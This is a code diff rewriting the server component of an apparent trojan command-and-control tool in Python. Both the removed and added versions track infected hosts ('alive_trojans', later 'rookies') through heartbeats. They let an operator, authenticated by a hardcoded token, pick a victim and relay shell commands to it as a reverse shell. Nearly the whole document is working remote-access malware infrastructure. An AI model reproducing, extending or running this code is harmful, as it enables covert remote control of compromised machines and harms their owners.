@@ -1,152 +1,112 @@
-from socket import socket, gethostname, gethostbyname, AF_INET, SOCK_STREAM, SOCK_DGRAM
-from multiprocessing import Process, Value
+import socketserver
+from utils import *
 from threading import Thread
 from time import sleep
-from logging import getLogger
-import logging_config
+from socket import gethostname, gethostbyname
+from socket import socket
+import logging
+import json
 
-
-logger = getLogger(__name__)
+logging.basicConfig(level=logging.DEBUG, filename='server.log', filemode='w')
 
 
 class Server:
-    def __init__(self,
-                 token: str,
-                 client_shell_port: int,
-                 client_communication_port: int,
-                 trojan_shell_port: int,
-                 trojan_communication_port: int,
-                 heartbeat_port: int
-                 ):
-        self.token = token.encode()
-        self.ports = {
-            'client_shell': client_shell_port,
-            'client_communication': client_communication_port,
-            'trojan_shell': trojan_shell_port,
-            'trojan_communication': trojan_communication_port,
-            'heartbeat': heartbeat_port
-        }
+    token = str()
+    rookies = dict()  # name: socket
+    rookies_ttl = dict()  # name: time to live
+    client_skt = socket()
 
-        logger.info(
-                f'Server set up:\n'
-                f'\tip: {gethostbyname(gethostname())}\n'
-                f'\tports:\n'
-                f'\t\tclient_shell: {client_shell_port}\n'
-                f'\t\tclient_communication: {client_communication_port}\n'
-                f'\t\ttrojan_shell: {trojan_shell_port}\n'
-                f'\t\ttrojan_communication: {trojan_communication_port}\n'
-                f'\t\theartbeat: {heartbeat_port}'
-        )
-        self.alive_trojans = {}
+    def __init__(self, token: str, port: int):
+        Server.token = token
+        self.port = port
 
     def run(self):
-        self._update_alive_list()
-        client_communication_socket = socket(AF_INET, SOCK_DGRAM)
-        client_communication_socket.bind(('', self.ports['client_communication']))
-        logger.info('Client communication socket set.')
+        ip = gethostbyname(gethostname())
+        logging.debug(f'server is running\n'
+                      f'ip: {ip}\n'
+                      f'port: {self.port}\n'
+                      f'token: {self.token}\n')
+        # dump configuration
+        with open('config.json', 'w') as f:
+            json.dump({'port': self.port, 'token': Server.token}, f)
+
+        Thread(target=self._update_rookie_ttl).start()
+
+        with socketserver.ThreadingTCPServer(('localhost', self.port), RequestHandler) as svr:
+            svr.serve_forever()
+
+    def _update_rookie_ttl(self):
+        while True:
+            for name in list(Server.rookies_ttl.keys()):
+                if self.rookies_ttl[name] == 0:
+                    del self.rookies[name]
+                    del self.rookies_ttl[name]
+                    logging.info(f'rookie {name} timed out')
+                else:
+                    self.rookies_ttl[name] -= 1
+            sleep(1)
+
+
+class RequestHandler(socketserver.BaseRequestHandler):
+    @IgnoreSE
+    def handle(self):
+        while True:
+            data = self.request.recv(1024)
+            header, msg = parse(data)
+            if len(msg) == 0:
+                continue
+            # [H]
+            if header == Header.heartbeat:
+                name = msg
+                if name not in Server.rookies.keys():
+                    logging.info(f'found new rookie: {name}')
+                Server.rookies[name] = self.request
+                Server.rookies_ttl[name] = 5
+            # [S]
+            elif header == Header.shell:
+                cmd = msg
+                send_with_header(Server.client_skt, Header.shell, cmd)
+            # [C]
+            elif header == Header.control:
+                token = msg
+                self.control_handler(token)
+
+    def control_handler(self, token):
+        if token != Server.token:
+            return
+        else:
+            send_with_header(self.request, Header.control, 'Rookie list:\n')
+            send_with_header(self.request, Header.control, '\n'.join(Server.rookies.keys()) + '\n')
+            send_with_header(self.request, Header.control, 'input a rookie name:\n')
+            while True:
+                data = self.request.recv(1024)
+                header, name = parse(data)
+                if header != Header.control:
+                    continue
+                logging.debug(f'received {data}')
+                if name not in Server.rookies.keys():
+                    send_with_header(self.request, Header.control, f'{name} not found\n')
+                else:
+                    send_with_header(self.request, Header.control, f'redirecting to {name}\n')
+                    break
+            self.reverse_shell(name)
+            IgnoreSE(Server.client_skt.close)()
+            IgnoreSE(Server.rookies[name].close)()
+            Server.client_skt = None
+
+    @IgnoreSE
+    def reverse_shell(self, rookie_name):
+        Server.client_skt = self.request
+        client_skt = self.request
+        rookie_skt = Server.rookies[rookie_name]
+        send_with_header(rookie_skt, Header.control, 'shell')
 
         while True:
-            b_msg, address = client_communication_socket.recvfrom(1024)
-            logger.debug(b_msg)
-            if b_msg == self.token:
-                client_communication_socket.sendto('ROOKIES:'.encode(), address)
-                for i in self.alive_trojans.keys():
-                    client_communication_socket.sendto(f'{i}'.encode(), address)
-
-                name = client_communication_socket.recvfrom(1024)[0].decode()
-                logger.debug(name)
-                if name in self.alive_trojans.keys():
-                    client_communication_socket.sendto(f'Redirecting to {name} ...'.encode(), address)
-                    client_communication_socket.close()
-                    ip = self.alive_trojans[name]['ip']
-                    interrupt = Value('b', 0)
-                    proc = Process(target=_exchange, args=(ip, self.ports, interrupt))
-                    proc.start()
-                    while interrupt.value == 0:
-                        pass
-                    proc.kill()
-                else:
-                    client_communication_socket.sendto(f'Can\'t find {name}, try again.'.encode(), address)
-
-    def _update_alive_list(self):
-        heartbeat_socket = socket(AF_INET, SOCK_DGRAM)
-        heartbeat_socket.bind(('', self.ports['heartbeat']))
-
-        def sup1():
-            while True:
-                b_name, address = heartbeat_socket.recvfrom(1024)
-                name = b_name.decode()
-                ip = address[0]
-                self.alive_trojans[name] = {
-                    'ip': ip,
-                    'lifetime': 5,
-                }
-
-        def sup2():
-            while True:
-                for name, i in self.alive_trojans.items():
-                    if i['lifetime'] == 0:
-                        del self.alive_trojans[name]
-                    else:
-                        i['lifetime'] -= 1
-                sleep(1)
-
-        Thread(target=sup1).start()
-        Thread(target=sup2).start()
+            cmd = recv_with_header(client_skt, Header.shell)
+            if len(cmd) > 0:
+                send_with_header(rookie_skt, Header.shell, cmd + '\n')
 
 
-def _exchange(trojan_ip: str, ports: dict, interrupt: Value):
-    interrupt = interrupt
-    interrupt.value = 0
-    temp_client_shell_socket = socket(AF_INET, SOCK_STREAM)
-    client_shell_socket = None
-    client_communication_socket = socket(AF_INET, SOCK_DGRAM)
-    temp_trojan_shell_socket = socket(AF_INET, SOCK_STREAM)
-    trojan_shell_socket = None
-    trojan_communication_socket = socket(AF_INET, SOCK_DGRAM)
-
-    client_communication_socket.bind(('', ports['client_communication']))
-    trojan_communication_socket.bind(('', ports['trojan_communication']))
-    trojan_communication_socket.sendto('shell'.encode(), (trojan_ip, ports['trojan_communication']))
-
-    Thread(target=temp_client_shell_socket.listen).start()
-    Thread(target=temp_trojan_shell_socket.listen).start()
-    max_waiting_time = 5
-    all_accepted = False
-
-    def wait_connection():
-        nonlocal max_waiting_time
-        nonlocal all_accepted
-        sleep(max_waiting_time)
-        if not all_accepted:
-            interrupt.value = 1
-            logger.debug('timeout')
-
-    Thread(target=wait_connection).start()
-    while not all_accepted:
-        try:
-            if client_shell_socket is None:
-                client_shell_socket = temp_client_shell_socket.accept()
-                logger.debug('client accepted')
-            elif trojan_shell_socket is None:
-                trojan_shell_socket = temp_trojan_shell_socket.accept()
-                logger.debug('trojan accepted')
-            else:
-                all_accepted = True
-        except OSError:
-            pass
-
-    def forward(sender: socket, receiver: socket):
-        try:
-            while True:
-                data = sender.recv(1024)
-                receiver.sendall(data)
-        except ConnectionError:
-            interrupt.value = 1
-
-    Thread(target=forward, args=(client_shell_socket, trojan_shell_socket))
-    Thread(target=forward, args=(trojan_shell_socket, client_shell_socket))
-    Thread(target=forward, args=(client_communication_socket, trojan_communication_socket))
-    Thread(target=forward, args=(trojan_communication_socket, client_communication_socket))
-
-
+if __name__ == '__main__':
+    server = Server(token='100109', port=36555)
+    server.run()
